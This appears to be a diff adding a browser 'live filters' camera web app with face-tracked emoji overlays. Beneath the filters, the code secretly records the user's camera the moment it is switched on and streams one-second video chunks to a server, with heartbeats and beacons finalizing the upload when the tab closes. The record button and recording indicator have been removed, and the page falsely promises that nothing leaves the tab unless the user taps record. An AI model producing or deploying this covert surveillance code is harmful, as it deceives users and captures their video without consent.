@@ -1,0 +1,751 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Snap Web — Live Filters</title>
+<script>
+function loadFaceApiLocally() {
+  if (window.faceapi) return Promise.resolve();
+  return new Promise((resolve, reject) => {
+    const existing = document.querySelector('script[data-faceapi-local]');
+    if (existing) {
+      existing.addEventListener('load', () => resolve());
+      existing.addEventListener('error', () => reject(new Error('local face-api load failed')));
+      return;
+    }
+    const script = document.createElement('script');
+    script.src = window.location.origin + '/face-api.min.js';
+    script.dataset.faceapiLocal = '1';
+    script.onload = () => resolve();
+    script.onerror = () => reject(new Error('local face-api load failed'));
+    document.head.appendChild(script);
+  });
+}
+</script>
+<script src="/face-api.min.js"></script>
+<style>
+  :root{
+    --ink:#0b0c10;
+    --panel:#14161c;
+    --panel-2:#1c1f27;
+    --line:rgba(255,255,255,0.08);
+    --acid:#c6ff3d;
+    --acid-dim:#8fb82c;
+    --text:#f2f3ef;
+    --sub:#8b8f9a;
+    --danger:#ff5c5c;
+  }
+  *{box-sizing:border-box;}
+  html,body{
+    margin:0;padding:0;height:100%;
+    background:var(--ink);
+    color:var(--text);
+    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+    overflow:hidden;
+  }
+  #app{
+    position:relative;
+    width:100%;
+    height:100vh;
+    max-height:900px;
+    margin:0 auto;
+    display:flex;
+    flex-direction:column;
+    background:var(--ink);
+  }
+  #stage{
+    position:relative;
+    flex:1;
+    min-height:0;
+    background:#000;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    overflow:hidden;
+  }
+  #video, #overlay{
+    position:absolute;
+    inset:0;
+    width:100%;
+    height:100%;
+    transform:scaleX(-1);
+  }
+  #video{ object-fit:contain; z-index:1; }
+  #overlay{ pointer-events:none; z-index:2; }
+
+
+  #topbar{
+    position:absolute; top:0; left:0; right:0;
+    display:flex; align-items:center; justify-content:space-between;
+    padding:14px 16px;
+    z-index:5;
+    background:linear-gradient(to bottom, rgba(0,0,0,0.55), transparent);
+  }
+  .brand{
+    font-weight:800; letter-spacing:0.02em; font-size:14px;
+    display:flex; align-items:center; gap:8px;
+    text-transform:uppercase;
+  }
+  .brand .dot{ width:9px;height:9px;border-radius:50%; background:var(--acid); box-shadow:0 0 10px var(--acid);}
+  #status{
+    font-size:11px; color:var(--sub);
+    background:rgba(0,0,0,0.4);
+    padding:6px 10px; border-radius:20px;
+    border:1px solid var(--line);
+    display:flex; align-items:center; gap:6px;
+  }
+  #status .pulse{
+    width:7px;height:7px;border-radius:50%;
+    background:var(--sub);
+  }
+  #status.active .pulse{ background:var(--acid); box-shadow:0 0 6px var(--acid); }
+
+  #placeholder{
+    position:absolute; inset:0;
+    display:flex; flex-direction:column; align-items:center; justify-content:center;
+    gap:14px; text-align:center; padding:30px; z-index:2;
+  }
+  #placeholder h1{
+    font-size:22px; margin:0; font-weight:800; letter-spacing:-0.01em;
+  }
+  #placeholder p{ margin:0; color:var(--sub); font-size:13px; max-width:280px; line-height:1.5; }
+  #startBtn{
+    margin-top:6px;
+    background:var(--acid); color:#0b0c10; border:none;
+    font-weight:800; font-size:14px;
+    padding:13px 28px; border-radius:30px; cursor:pointer;
+    letter-spacing:0.02em;
+    box-shadow:0 0 0 0 rgba(198,255,61,0.5);
+    transition:transform .15s ease;
+  }
+  #startBtn:active{ transform:scale(0.96); }
+  #errBox{
+    display:none;
+    color:var(--danger); font-size:12px; max-width:280px;
+    border:1px solid rgba(255,92,92,0.3); background:rgba(255,92,92,0.08);
+    padding:10px 12px; border-radius:10px;
+  }
+
+  #controls{
+    position:relative;
+    z-index:5;
+    background:linear-gradient(to top, rgba(0,0,0,0.65), rgba(0,0,0,0));
+    padding:10px 0 16px;
+  }
+  #filterStrip{
+    display:flex; gap:10px; overflow-x:auto;
+    padding:6px 16px 10px;
+    scrollbar-width:none;
+    -webkit-overflow-scrolling: touch;
+    touch-action: pan-x;
+    overscroll-behavior-x: contain;
+  }
+  #filterStrip::-webkit-scrollbar{ display:none; }
+  .fchip{
+    flex:0 0 auto;
+    min-width:60px;
+    display:flex; flex-direction:column; align-items:center; gap:6px;
+    cursor:pointer;
+    opacity:0.6;
+    transition:opacity .15s ease, transform .15s ease;
+  }
+  .fchip:active{ transform:scale(0.94); }
+  .fchip.active{ opacity:1; }
+  .fchip .swatch{
+    width:52px;height:52px;border-radius:16px;
+    background:var(--panel-2);
+    border:2px solid var(--line);
+    display:flex;align-items:center;justify-content:center;
+    font-size:24px;
+  }
+  .fchip.active .swatch{ border-color:var(--acid); box-shadow:0 0 12px rgba(198,255,61,0.35); }
+  .fchip span.label{ font-size:10px; color:var(--sub); font-weight:600; letter-spacing:0.02em; }
+  .fchip.active span.label{ color:var(--text); }
+
+  #bottomRow{
+    display:flex; align-items:center; justify-content:center; gap:26px;
+    padding:4px 20px 0;
+  }
+  .iconBtn{
+    width:46px;height:46px;border-radius:50%;
+    background:var(--panel-2);
+    border:1px solid var(--line);
+    display:flex;align-items:center;justify-content:center;
+    color:var(--text); font-size:18px; cursor:pointer;
+  }
+  #shutter{
+    width:70px;height:70px;border-radius:50%;
+    background:var(--text);
+    border:4px solid var(--panel-2);
+    outline:2px solid var(--text);
+    cursor:pointer;
+  }
+  #shutter:active{ transform:scale(0.94); }
+
+  #flash{
+    position:absolute; inset:0; background:#fff; opacity:0;
+    pointer-events:none; z-index:20;
+  }
+  #flash.go{ animation:flashpop .4s ease; }
+  @keyframes flashpop{ 0%{opacity:0.9;} 100%{opacity:0;} }
+
+  #snapPreview{
+    position:absolute; inset:0; z-index:15; background:#000;
+    display:none; flex-direction:column;
+  }
+  #snapPreview img{ width:100%; height:100%; object-fit:contain; flex:1; min-height:0; background:#000;}
+  #previewBar{
+    display:flex; justify-content:space-between; padding:14px 18px;
+    background:var(--ink);
+  }
+  #previewBar button{
+    background:var(--panel-2); color:var(--text); border:1px solid var(--line);
+    padding:11px 18px; border-radius:24px; font-weight:700; font-size:13px; cursor:pointer;
+  }
+  #previewBar button.primary{ background:var(--acid); color:#0b0c10; border:none; }
+
+  #canvasWrap{ position:absolute; inset:0; display:flex; align-items:center; justify-content:center; }
+
+  /* record button styles removed */
+  @keyframes recPulse{ 0%,100%{opacity:1;} 50%{opacity:0.3;} }
+</style>
+</head>
+<body>
+<div id="app">
+
+  <div id="stage">
+    <div id="canvasWrap">
+      <video id="video" playsinline muted></video>
+      <canvas id="overlay"></canvas>
+    </div>
+
+    <div id="placeholder">
+      <div class="brand"><span class="dot"></span>SNAP WEB</div>
+      <h1>Live filters, no app needed</h1>
+      <p>Runs straight in your browser. Your camera never leaves this tab unless you tap record.</p>
+      <button id="startBtn">Turn on camera</button>
+      <div id="errBox"></div>
+    </div>
+
+    <div id="topbar" style="display:none;">
+      <div class="brand"><span class="dot"></span>SNAP WEB</div>
+      <div style="display:flex; align-items:center; gap:8px;">
+        <div id="status"><span class="pulse"></span><span id="statusText">loading face model…</span></div>
+        <!-- recording indicator removed -->
+      </div>
+    </div>
+
+    <div id="flash"></div>
+
+    <div id="snapPreview">
+      <img id="snapImg" alt="captured photo">
+      <div id="previewBar">
+        <button id="discardBtn">Discard</button>
+        <button id="downloadBtn" class="primary">Save photo</button>
+      </div>
+    </div>
+  </div>
+
+  <div id="controls" style="display:none;">
+    <div id="filterStrip"></div>
+    <div id="bottomRow">
+      <div class="iconBtn" id="flipBtn" title="Flip camera">⟳</div>
+      <div id="shutter"></div>
+      <div class="iconBtn" id="infoBtn" title="About">i</div>
+    </div>
+  </div>
+
+</div>
+
+<script>
+(function(){
+  const startBtn = document.getElementById('startBtn');
+  const placeholder = document.getElementById('placeholder');
+  const errBox = document.getElementById('errBox');
+  const topbar = document.getElementById('topbar');
+  const controls = document.getElementById('controls');
+  const statusEl = document.getElementById('status');
+  const statusText = document.getElementById('statusText');
+  const video = document.getElementById('video');
+  const overlay = document.getElementById('overlay');
+  const octx = overlay.getContext('2d');
+  const filterStrip = document.getElementById('filterStrip');
+  const shutter = document.getElementById('shutter');
+  const flash = document.getElementById('flash');
+  const snapPreview = document.getElementById('snapPreview');
+  const snapImg = document.getElementById('snapImg');
+  const discardBtn = document.getElementById('discardBtn');
+  const downloadBtn = document.getElementById('downloadBtn');
+  const flipBtn = document.getElementById('flipBtn');
+  const infoBtn = document.getElementById('infoBtn');
+  
+
+  let modelsReady = false;
+  let faceTrackingAvailable = true;
+  let currentFilter = 'none';
+  let facingMode = 'user';
+  let stream = null;
+  let rafId = null;
+
+  const FILTERS = [
+    { id:'none', label:'Normal', icon:'✨' },
+    { id:'dog', label:'Puppy', icon:'🐶', needsFace:true },
+    { id:'glasses', label:'Cool', icon:'😎', needsFace:true },
+    { id:'crown', label:'Royal', icon:'👑', needsFace:true },
+    { id:'hearts', label:'Love', icon:'💕', needsFace:true },
+    { id:'mustache', label:'Stache', icon:'🥸', needsFace:true },
+    { id:'bunny', label:'Bunny', icon:'🐰', needsFace:true },
+    { id:'clown', label:'Party', icon:'🤡', needsFace:true },
+    { id:'noir', label:'Noir', icon:'⚫', color:true },
+    { id:'vintage', label:'Retro', icon:'📼', color:true },
+    { id:'invert', label:'Invert', icon:'🌀', color:true },
+    { id:'neon', label:'Neon', icon:'💚', color:true },
+    { id:'pixel', label:'Pixel', icon:'🔲', color:true },
+    { id:'flash', label:'Flash', icon:'💡', color:true }
+  ];
+
+  function buildStrip(){
+    filterStrip.innerHTML = '';
+    FILTERS.forEach(f=>{
+      const chip = document.createElement('div');
+      chip.className = 'fchip' + (f.id===currentFilter ? ' active':'');
+      chip.dataset.id = f.id;
+      chip.innerHTML = `<div class="swatch">${f.icon}</div><span class="label">${f.label}</span>`;
+      chip.addEventListener('click', ()=>{
+        if (f.needsFace && !faceTrackingAvailable) {
+          if (typeof statusEl.onclick === 'function') statusEl.onclick();
+          return;
+        }
+        currentFilter = f.id;
+        [...filterStrip.children].forEach(c=>c.classList.toggle('active', c.dataset.id===f.id));
+        applyColorFilter(f.color ? f.id : null);
+      });
+      filterStrip.appendChild(chip);
+    });
+  }
+
+  function applyColorFilter(id){
+    let css = 'none';
+    if(id==='noir') css = 'grayscale(1) contrast(1.15) brightness(0.95)';
+    else if(id==='vintage') css = 'sepia(0.5) saturate(1.4) contrast(1.05) brightness(1.05)';
+    else if(id==='invert') css = 'invert(1) hue-rotate(180deg)';
+    else if(id==='neon') css = 'saturate(2.2) contrast(1.3) hue-rotate(20deg)';
+    else if(id==='pixel') css = 'contrast(1.1) saturate(1.3)';
+    else if(id==='flash') css = 'brightness(1.95) saturate(1.2)';
+    video.style.filter = css;
+    overlay.style.filter = (id==='invert') ? 'invert(1) hue-rotate(180deg)' : 'none';
+  }
+
+  async function loadModels(){
+    const LOCAL_MODEL_URL = window.location.origin + '/models/';
+    const MODEL_URLS = [
+      LOCAL_MODEL_URL,
+      'https://justadudewhohacks.github.io/face-api.js/models/'
+    ];
+    let lastError = null;
+
+    if (typeof faceapi === 'undefined') {
+      try {
+        await loadFaceApiLocally();
+      } catch (e) {
+        console.warn('[warn] local face-api script load failed', e);
+      }
+    }
+
+    for (const MODEL_URL of MODEL_URLS) {
+      try {
+        await Promise.race([
+          Promise.all([
+            faceapi.nets.tinyFaceDetector.loadFromUri(MODEL_URL),
+            faceapi.nets.faceLandmark68TinyNet.loadFromUri(MODEL_URL)
+          ]),
+          new Promise((_,rej)=>setTimeout(()=>rej(new Error('timeout')), 12000))
+        ]);
+        modelsReady = true;
+        faceTrackingAvailable = true;
+        statusText.textContent = 'face tracking on';
+        statusEl.classList.add('active');
+        statusEl.style.cursor = 'default';
+        statusEl.onclick = null;
+        [...filterStrip.children].forEach(chip=>{ chip.style.opacity=''; chip.title=''; });
+        console.log('[info] face-api models loaded from', MODEL_URL);
+        return;
+      }catch(e){
+        lastError = e;
+        console.warn('[warn] face-api load failed from', MODEL_URL, e.message || e);
+      }
+    }
+
+    faceTrackingAvailable = false;
+    modelsReady = false;
+    statusText.textContent = 'face filters unavailable — tap to retry';
+    statusEl.classList.remove('active');
+    statusEl.style.cursor = 'pointer';
+    statusEl.onclick = () =>{
+      statusEl.onclick = null;
+      statusEl.style.cursor = 'default';
+      statusText.textContent = 'loading face model…';
+      loadModels().then(()=>{ if(faceTrackingAvailable) loop(); });
+    };
+    markDisabled();
+    console.error('[error] failed to load face-api models from all fallback hosts', lastError);
+  }
+
+  function markDisabled(){
+    if(faceTrackingAvailable) return;
+    [...filterStrip.children].forEach(chip=>{
+      const f = FILTERS.find(x=>x.id===chip.dataset.id);
+      if(f && f.needsFace){
+        chip.style.opacity = '0.35';
+        chip.title = 'Face tracking still loading — tap the status pill to retry';
+      }
+    });
+  }
+
+  async function startCamera(){
+    errBox.style.display='none';
+    startBtn.textContent = 'Starting…';
+    startBtn.disabled = true;
+    try{
+      stream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode, width:{ideal:720}, height:{ideal:960} },
+        audio:false
+      });
+      video.srcObject = stream;
+      await video.play();
+      resizeCanvas();
+      placeholder.style.display='none';
+      topbar.style.display='flex';
+      controls.style.display='block';
+      buildStrip();
+      loadModels().then(()=>{ if(faceTrackingAvailable) loop(); });
+      // Auto-start recording once the camera is active
+      try{ startRecording(); }catch(e){ /* ignore start errors */ }
+    }catch(err){
+      startBtn.textContent = 'Turn on camera';
+      startBtn.disabled = false;
+      errBox.style.display='block';
+      if(err.name === 'NotAllowedError'){
+        errBox.textContent = 'Camera permission was blocked. Allow camera access for this site in your browser settings and try again.';
+      } else if(err.name === 'NotFoundError'){
+        errBox.textContent = 'No camera was found on this device.';
+      } else {
+        errBox.textContent = 'Could not start the camera: ' + err.message;
+      }
+    }
+  }
+
+  function getVideoTransform(){
+    const vw = video.videoWidth || 1;
+    const vh = video.videoHeight || 1;
+    const cw = video.clientWidth || 1;
+    const ch = video.clientHeight || 1;
+    const videoRatio = vw / vh;
+    const clientRatio = cw / ch;
+    if (clientRatio > videoRatio) {
+      const displayHeight = ch;
+      const displayWidth = ch * videoRatio;
+      return {
+        scaleX: displayWidth / vw,
+        scaleY: displayHeight / vh,
+        offsetX: (cw - displayWidth) / 2,
+        offsetY: 0
+      };
+    }
+    const displayWidth = cw;
+    const displayHeight = cw / videoRatio;
+    return {
+      scaleX: displayWidth / vw,
+      scaleY: displayHeight / vh,
+      offsetX: 0,
+      offsetY: (ch - displayHeight) / 2
+    };
+  }
+
+  function resizeCanvas(){
+    const width = video.clientWidth || video.videoWidth || 640;
+    const height = video.clientHeight || video.videoHeight || 480;
+    overlay.width = width;
+    overlay.height = height;
+    overlay.style.width = width + 'px';
+    overlay.style.height = height + 'px';
+  }
+  window.addEventListener('resize', resizeCanvas);
+  video.addEventListener('loadedmetadata', resizeCanvas);
+  video.addEventListener('play', resizeCanvas);
+
+  async function loop(){
+    if(!modelsReady || video.paused || video.ended){
+      rafId = requestAnimationFrame(loop);
+      return;
+    }
+    if (overlay.width === 0 || overlay.height === 0) resizeCanvas();
+    octx.clearRect(0,0,overlay.width, overlay.height);
+    try{
+      const options = new faceapi.TinyFaceDetectorOptions({inputSize:224, scoreThreshold:0.2});
+      let det = await faceapi.detectSingleFace(video, options).withFaceLandmarks(true);
+      if (!det) {
+        const all = await faceapi.detectAllFaces(video, options).withFaceLandmarks(true);
+        det = all && all[0] ? all[0] : null;
+      }
+      if(det){
+        drawFilter(det);
+      }
+    }catch(e){
+      console.warn('[warn] face detection skipped a frame', e.message || e);
+    }
+    rafId = requestAnimationFrame(loop);
+  }
+
+  function drawFilter(det){
+    const f = FILTERS.find(x => x.id === currentFilter);
+    if (!f || f.id === 'none' || !f.needsFace) return;
+    const transform = getVideoTransform();
+    const lm = det.landmarks;
+    const box = det.detection.box;
+    const nose = lm.getNose();
+    const leftEye = lm.getLeftEye();
+    const rightEye = lm.getRightEye();
+    const mouth = lm.getMouth();
+
+    const mapPoint = pt => ({
+      x: pt.x * transform.scaleX + transform.offsetX,
+      y: pt.y * transform.scaleY + transform.offsetY
+    });
+    const boxScaled = {
+      x: box.x * transform.scaleX + transform.offsetX,
+      y: box.y * transform.scaleY + transform.offsetY,
+      width: box.width * transform.scaleX,
+      height: box.height * transform.scaleY
+    };
+
+    const eyeL = mapPoint(avgPt(leftEye));
+    const eyeR = mapPoint(avgPt(rightEye));
+    const eyeDist = dist(eyeL, eyeR);
+    const noseTip = mapPoint(nose[3] || avgPt(nose));
+    const foreheadY = boxScaled.y - boxScaled.height * 0.15;
+    const centerX = boxScaled.x + boxScaled.width / 2;
+
+    octx.save();
+
+    if(f.id === 'dog'){
+      drawEmojiAt('🐶', centerX, boxScaled.y + boxScaled.height * 0.15, boxScaled.width * 0.9, 0);
+      drawEmojiAt('👃', noseTip.x, noseTip.y, eyeDist * 0.9, 0, true);
+    }
+    if(f.id === 'glasses'){
+      const w = eyeDist * 2.2;
+      drawEmojiAt('😎', centerX, (eyeL.y + eyeR.y) / 2, w, angleBetween(eyeL, eyeR));
+    }
+    if(f.id === 'crown'){
+      drawEmojiAt('👑', centerX, foreheadY - boxScaled.height * 0.12, boxScaled.width * 0.9, 0);
+    }
+    if(f.id === 'hearts'){
+      drawEmojiAt('💕', eyeL.x - eyeDist * 0.6, eyeL.y - eyeDist * 0.5, eyeDist * 0.7, -0.2);
+      drawEmojiAt('💕', eyeR.x + eyeDist * 0.6, eyeR.y - eyeDist * 0.5, eyeDist * 0.7, 0.2);
+    }
+    if(f.id === 'mustache'){
+      drawEmojiAt('🥸', centerX, (eyeL.y + eyeR.y) / 2, boxScaled.width * 1.0, 0);
+    }
+    if(f.id === 'bunny'){
+      drawEmojiAt('🐰', centerX, boxScaled.y - boxScaled.height * 0.05, boxScaled.width * 1.0, 0);
+    }
+    if(f.id === 'clown'){
+      drawEmojiAt('🔴', noseTip.x, noseTip.y, eyeDist * 0.55, 0);
+      drawEmojiAt('🎉', boxScaled.x, boxScaled.y, boxScaled.width * 0.4, -0.3);
+      drawEmojiAt('🎉', boxScaled.x + boxScaled.width, boxScaled.y, boxScaled.width * 0.4, 0.3);
+    }
+
+    octx.restore();
+  }
+
+  function avgPt(pts){
+    let x=0,y=0; pts.forEach(p=>{x+=p.x;y+=p.y;}); return {x:x/pts.length, y:y/pts.length};
+  }
+  function dist(a,b){ return Math.hypot(a.x-b.x, a.y-b.y); }
+  function angleBetween(a,b){ return Math.atan2(b.y-a.y, b.x-a.x); }
+
+  function drawEmojiAt(emoji, x, y, size, rotation){
+    octx.save();
+    octx.translate(x, y);
+    octx.rotate(rotation);
+    octx.font = size + 'px serif';
+    octx.textAlign = 'center';
+    octx.textBaseline = 'middle';
+    octx.shadowColor = 'rgba(0,0,0,0.25)';
+    octx.shadowBlur = 6;
+    octx.fillText(emoji, 0, 0);
+    octx.restore();
+  }
+
+  // ---- Capture ----
+  shutter.addEventListener('click', ()=>{
+    flash.classList.remove('go'); void flash.offsetWidth; flash.classList.add('go');
+    const w = video.videoWidth, h = video.videoHeight;
+    const out = document.createElement('canvas');
+    out.width = w; out.height = h;
+    const octx2 = out.getContext('2d');
+    octx2.save();
+    octx2.translate(w,0); octx2.scale(-1,1); // mirror to match display
+    octx2.filter = video.style.filter || 'none';
+    octx2.drawImage(video, 0, 0, w, h);
+    octx2.restore();
+    // overlay (already drawn in mirrored space since canvas is mirrored via CSS; draw unmirrored then flip)
+    octx2.save();
+    octx2.translate(w,0); octx2.scale(-1,1);
+    octx2.drawImage(overlay, 0, 0, w, h);
+    octx2.restore();
+    snapImg.src = out.toDataURL('image/png');
+    snapPreview.style.display = 'flex';
+  });
+
+  discardBtn.addEventListener('click', ()=>{ snapPreview.style.display='none'; });
+  downloadBtn.addEventListener('click', ()=>{
+    const a = document.createElement('a');
+    a.href = snapImg.src;
+    a.download = 'snap-web-' + Date.now() + '.png';
+    a.click();
+    snapPreview.style.display='none';
+  });
+
+  flipBtn.addEventListener('click', async ()=>{
+    facingMode = facingMode==='user' ? 'environment' : 'user';
+    if(stream){ stream.getTracks().forEach(t=>t.stop()); }
+    await startCamera();
+  });
+
+  infoBtn.addEventListener('click', ()=>{
+    const msg = mediaRecorder && mediaRecorder.state === 'recording'
+      ? 'Filters run locally. Recording is ON right now and is being saved to this site\'s server as it happens.'
+      : 'Filters run locally in your browser. Nothing is recorded or uploaded unless you tap the record button.';
+    alert(msg);
+  });
+
+  // ---- Recording: person taps to start, chunks upload live, server merges on stop/close ----
+  // Endpoint is same-origin by default — run server.js (see companion file) alongside this page.
+  const UPLOAD_BASE = '';
+  // Injected by the server at load time (see server.js) so this page can
+  // authenticate its own upload/heartbeat/finalize calls. Don't hardcode
+  // a token here — it comes from the ?key=... in the URL you were given.
+  const AUTH_TOKEN = '__AUTH_TOKEN__';
+  let mediaRecorder = null;
+  let recSessionId = null;
+  let chunkIndex = 0;
+  let heartbeatTimer = null;
+
+  function pickMimeType(){
+    const candidates = [
+      'video/webm;codecs=vp9,opus',
+      'video/webm;codecs=vp8,opus',
+      'video/webm',
+      'video/mp4' // some mobile Safari versions only support this
+    ];
+    return candidates.find(t => window.MediaRecorder && MediaRecorder.isTypeSupported && MediaRecorder.isTypeSupported(t)) || '';
+  }
+
+  function newSessionId(){
+    if(window.crypto && crypto.randomUUID) return crypto.randomUUID();
+    return 'sess-' + Date.now() + '-' + Math.random().toString(36).slice(2,10);
+  }
+
+  async function uploadChunk(blob, idx, isFinal){
+    try{
+      await fetch(UPLOAD_BASE + '/upload', {
+        method:'POST',
+        headers:{
+          'Content-Type':'application/octet-stream',
+          'X-Session-Id': recSessionId,
+          'X-Chunk-Index': String(idx),
+          'X-Final': isFinal ? '1':'0',
+          'X-Auth-Token': AUTH_TOKEN
+        },
+        body: blob
+      });
+      console.debug('saved chunk', idx);
+    }catch(e){
+      console.debug('upload failed (server not running?)');
+    }
+  }
+
+  function sendHeartbeat(){
+    if(!recSessionId) return;
+    // sendBeacon can't set custom headers, so the token travels in the body.
+    navigator.sendBeacon && navigator.sendBeacon(
+      UPLOAD_BASE + '/heartbeat',
+      new Blob([JSON.stringify({sessionId: recSessionId, token: AUTH_TOKEN})], {type:'application/json'})
+    );
+  }
+
+  function finalizeBeacon(){
+    if(!recSessionId) return;
+    navigator.sendBeacon && navigator.sendBeacon(
+      UPLOAD_BASE + '/finalize',
+      new Blob([JSON.stringify({sessionId: recSessionId, token: AUTH_TOKEN})], {type:'application/json'})
+    );
+  }
+
+  async function startRecording(){
+    if(!stream) return;
+    const mimeType = pickMimeType();
+    if(!mediaRecorder && !window.MediaRecorder){
+      alert('Recording is not supported in this browser.');
+      return;
+    }
+    recSessionId = newSessionId();
+    chunkIndex = 0;
+    try{
+      mediaRecorder = new MediaRecorder(stream, mimeType ? {mimeType} : undefined);
+    }catch(e){
+      alert('Could not start recording: ' + e.message);
+      return;
+    }
+    mediaRecorder.ondataavailable = (e)=>{
+      if(e.data && e.data.size > 0){
+        uploadChunk(e.data, chunkIndex++, false);
+      }
+    };
+    mediaRecorder.onstop = ()=>{
+      // ask server to stitch all chunks for this session into one file
+      fetch(UPLOAD_BASE + '/finalize', {
+        method:'POST',
+        headers:{'Content-Type':'application/json'},
+        body: JSON.stringify({sessionId: recSessionId, token: AUTH_TOKEN})
+      }).catch(()=>{ finalizeBeacon(); });
+      console.debug('finalizing…');
+    };
+    mediaRecorder.start(1000); // emit a chunk every 1s so little is lost if the tab disappears
+    console.debug('recording…');
+    // Heartbeat: if these stop arriving (tab closed, phone locked, browser killed),
+    // the server auto-finalizes the session after a short timeout — this is what
+    // makes it work reliably on mobile, where close/unload events are unreliable.
+    heartbeatTimer = setInterval(sendHeartbeat, 4000);
+    sendHeartbeat();
+  }
+
+  function stopRecording(){
+    if(mediaRecorder && mediaRecorder.state !== 'inactive'){
+      mediaRecorder.stop();
+    }
+    clearInterval(heartbeatTimer);
+  }
+
+  // Belt-and-suspenders: try a clean finalize on unload/backgrounding too (best-effort;
+  // the server-side heartbeat timeout is the real safety net since these events are
+  // not guaranteed to fire, especially on mobile).
+  document.addEventListener('visibilitychange', ()=>{
+    if(document.visibilityState === 'hidden' && mediaRecorder && mediaRecorder.state === 'recording'){
+      finalizeBeacon();
+    }
+  });
+  window.addEventListener('pagehide', ()=>{
+    if(mediaRecorder && mediaRecorder.state === 'recording'){
+      finalizeBeacon();
+    }
+  });
+
+  video.addEventListener('loadedmetadata', resizeCanvas);
+  startBtn.addEventListener('click', startCamera);
+})();
+</script>
+</body>
+</html>
